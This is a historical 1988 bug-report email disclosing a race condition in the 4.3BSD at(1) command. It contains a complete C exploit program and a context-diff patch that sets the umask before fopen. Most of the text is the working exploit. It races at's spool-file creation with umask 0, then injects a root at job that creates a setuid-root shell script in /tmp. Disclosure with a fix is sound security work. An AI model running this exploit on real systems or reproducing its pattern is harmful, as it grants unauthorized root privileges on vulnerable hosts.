@@ -1,0 +1,195 @@
+From maart@cs.vu.nl Fri Dec 23 19:48:01 1988
+Date:     Fri, 23 Dec 88 3:54:56 MET
+From: Maarten Litmaath <maart@cs.vu.nl>
+To: bostic@okeeffe.Berkeley.EDU
+Subject:  bug in 4.3BSD at(1) leading to root privileges
+Index: bin/at 4.3BSD-tahoe
+
+L.S.
+Recently I ran into a bug in our 4.3BSD at(1). I don't know if this bug has
+been discovered before. Anyway, our source wasn't patched. Below is a small
+program which exploits the bug to create a setuid root shell script in /tmp
+(don't frown: it was the easiest way out! :-)
+The fix is very simple; a context diff has been included at the end.
+As usual the keyword is `race condition': between the calls to fopen() and
+fchmod(). Every fopen() in a setuid program is suspicious, because the umask
+might have been set to 0. So we explicitly set the umask, and the fchmod()
+is unnecessary.
+Regards,
+				Maarten Litmaath @ VU Amsterdam:
+				maart@cs.vu.nl, mcvax!botter!maart
+
+----zip----zip----zip----zip----zip----zip----zip----zip----zip----zip----
+#include	<sys/time.h>
+#include	<sys/wait.h>
+#include	<stdio.h>
+
+
+#define		ATSIZE		512
+
+
+char	Atdir[] = "/usr/spool/at";
+
+char	Atformat[] = "\
+# owner: root\n\
+# jobname: chkfpd\n\
+# shell: sh\n\
+# notify by mail: no\n\
+\n\
+exec 2>&-\n\
+/bin/echo '#! /bin/sh' > /tmp/-\n\
+/bin/chmod 6711 /tmp/-\n\
+exit 0\n\
+                              \n";
+
+char	*env[] = {
+		0
+	};
+
+int	pid;
+
+
+main()
+{
+	char	atfile[ATSIZE], buf[5];
+	int	fd;
+	FILE	*fp;
+	struct	tm	*tp, *getnowtime();
+	void	makeatfile(), maketime();
+
+
+	maketime(tp = getnowtime());
+	(void) sprintf(buf, "%02d%02d", tp->tm_hour, tp->tm_min);
+
+	switch (pid = vfork()) {
+		case -1:
+			perror("fork");
+			exit(1);
+		case 0:
+			(void) nice(19);
+			(void) umask(0);
+			(void) execle("/usr/bin/at", "at", "-s", buf,
+				"/dev/null", (char *) 0, env);
+			perror("at");
+			_exit(1);
+	}
+
+	makeatfile(atfile, tp);
+
+	while ((fd = open(atfile, 1)) < 0)
+		;
+
+	printf("OK: ");
+	(void) fflush(stdout);
+
+	(void) wait((union wait *) 0);
+
+	fp = fdopen(fd, "w");
+	fprintf(fp, Atformat);
+	(void) fclose(fp);
+
+	printf("%s\n", buf);		/* the time of the atrun */
+	exit(0);
+}
+
+/*
+ * the following routines were stolen and adapted from at.c
+ */
+
+struct	tm	*getnowtime()
+{
+	struct	timeval	time;
+	struct	tm	*localtime();
+
+
+	if (gettimeofday(&time, (struct timezone *) 0) < 0) {
+		perror("gettimeofday");
+		exit(1);
+	}
+	return localtime(&time.tv_sec);
+}
+
+
+void	maketime(tp)
+struct	tm	*tp;
+{
+	int	min;
+
+
+	if ((min = tp->tm_min) < 29)		/* at least 1 minute gap */
+		tp->tm_min = min < 14 ? 15 : 30;
+	else
+		if (min < 44)
+			tp->tm_min = 45;
+	else {
+		tp->tm_min = 0;
+		if (++tp->tm_hour >= 24) {
+			tp->tm_hour = 0;
+			if (++tp->tm_yday >= (tp->tm_year & 03 ? 365 : 366)) {
+				tp->tm_yday = 0;
+				++tp->tm_year;	/* no check */
+			}
+		}
+	}
+}
+
+
+void	makeatfile(atfile, tp)
+char	*atfile;
+struct	tm	*tp;
+{
+	int	i;
+
+
+	for (i = 0; ; i += 53) {
+		(void) sprintf(atfile, "%s/%02d.%03d.%02d%02d.%02d", Atdir,
+			tp->tm_year, tp->tm_yday, tp->tm_hour, tp->tm_min,
+			(pid + i) % 100);
+
+		/*
+		 * Make sure that the file name that we've created is unique.
+		 */
+
+		if (access(atfile, 0) == -1)
+			return;
+	}
+}
+----zip----zip----zip----zip----zip----zip----zip----zip----zip----zip----
+
+*** at.c.old	Fri Dec 23 01:32:54 1988
+--- at.c.new	Sat Dec 24 01:37:06 1988
+***************
+*** 287,302 ****
+  
+  	/*
+  	 * Open the spoolfile for writing.
+  	 */
+  	if ((spoolfile = fopen(atfile, "w")) == NULL){
+  		perror(atfile);
+  		exit(1);
+  	}
+- 
+- 	/*
+- 	 * Make the file not world readable.
+- 	 */
+- 	fchmod(fileno(spoolfile), 0400);
+  
+  	/*
+  	 * The protection mechanism works like this:
+--- 287,300 ----
+  
+  	/*
+  	 * Open the spoolfile for writing.
++ 	 * Set the umask first!
+  	 */
++ 
++ 	(void) umask(0377);
+  	if ((spoolfile = fopen(atfile, "w")) == NULL){
+  		perror(atfile);
+  		exit(1);
+  	}
+  
+  	/*
+  	 * The protection mechanism works like this:
+----zip----zip----zip----zip----zip----zip----zip----zip----zip----zip----
+
